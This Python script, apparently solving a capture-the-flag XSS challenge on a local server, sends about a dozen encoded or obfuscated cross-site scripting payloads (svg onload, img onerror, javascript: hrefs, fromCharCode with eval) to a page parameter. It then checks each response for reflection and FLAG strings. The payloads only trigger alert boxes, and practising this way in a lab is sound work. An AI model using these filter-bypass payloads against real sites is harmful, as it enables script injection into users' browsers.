import requests
import urllib.parse
import re

base_url = "http://127.0.0.1:33203/page"

# Additional advanced XSS bypass techniques
advanced_payloads = [
    # Double URL encoding
    ("Double URL encode", urllib.parse.quote(urllib.parse.quote("<svg onload=alert('XSS')>")), "double_url"),
    
    # HTML entity encoding (mixed approach)
    ("HTML entity mix", "<svg onload=alert(&#39;XSS&#39;)>", "html_entity_mix"),
    
    # Unicode escapes
    ("Unicode escapes", "<svg onload=\\u0061\\u006c\\u0065\\u0072\\u0074('XSS')>", "unicode_js"),
    
    # Hex encoding
    ("Hex encoding", "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>", "hex_js"),
    
    # Case variations in event handler
    ("Mixed case handler", "<svg oNloAd=alert('XSS')>", "mixed_case_handler"),
    
    # Without quotes
    ("No quotes", "<svg onload=alert(XSS)>", "no_quotes"),
    
    # Using backticks instead of quotes
    ("Backticks", "<svg onload=alert(`XSS`)>", "backticks"),
    
    # Different tag: img with onerror
    ("Img onerror", "<img src=x onerror=alert('XSS')>", "img_onerror"),
    
    # Body onload
    ("Body onload", "<body onload=alert('XSS')>", "body_onload"),
    
    # Anchor with href javascript
    ("Anchor javascript", '<a href="javascript:alert(\'XSS\')">click</a>', "anchor_js"),
    
    # Using confirm instead of alert
    ("Confirm instead", "<svg onload=confirm('XSS')>", "confirm"),
    
    # Encoded quotes only
    ("Encoded quotes", '<svg onload=alert("XSS")>', "encoded_quotes_double")
]

print("[*] Testing Advanced XSS Bypass Techniques")

for test_name, payload, test_id in advanced_payloads:
    print(f"\n[+] Testing: {test_name}")
    print(f"    [PAYLOAD] {payload[:100]}")
    
    try:
        params = {'name': payload}
        response = requests.get(base_url, params=params, timeout=10)
        
        payload_reflected = payload in response.text
        response_length = len(response.content)
        
        # Check for alert/confirm indicators
        indicators = []
        if 'alert' in response.text.lower():
            indicators.append('alert')
        if 'confirm' in response.text.lower():
            indicators.append('confirm')
        if 'XSS' in response.text:
            indicators.append('XSS')
        
        # Check for FLAG patterns
        flag_patterns = re.findall(r'FLAG\{[^}]+\}', response.text)
        
        print(f"    [STATUS]  {response.status_code}")
        print(f"    [LENGTH]  {response_length} bytes")
        print(f"    [REFLECT] Payload reflected: {payload_reflected}")
        
        if indicators:
            print(f"    [FOUND]   Indicators: {', '.join(indicators)}")
        
        if flag_patterns:
            print(f"    [!!]      FLAG DETECTED: {flag_patterns}")
        
        # Check which star image is displayed
        if 'error_star.png' in response.text:
            print(f"    [RESULT]  Failed! Try again!")
        elif 'new_star.png' in response.text:
            print(f"    [RESULT]  Let the game begin / Filtered")
        
        print(f"    [RESPONSE]: {response.text}")
        
    except Exception as e:
        print(f"    [ERROR]   {str(e)}")

print("\n[*] Advanced testing complete")
